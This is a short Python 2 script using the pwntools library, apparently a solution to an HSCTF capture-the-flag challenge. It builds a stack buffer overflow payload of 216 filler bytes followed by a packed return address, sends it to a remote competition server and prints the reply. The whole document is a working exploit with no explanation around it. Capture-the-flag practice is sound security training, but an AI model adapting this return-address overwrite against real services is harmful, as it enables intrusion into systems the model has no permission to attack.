from pwn import *

payload = 'A'*216+p64(0x4011d6)
p = remote('pwn.hsctf.com',5002)
print p.recvuntil(': ')
p.sendline(payload)
print p.recvall()
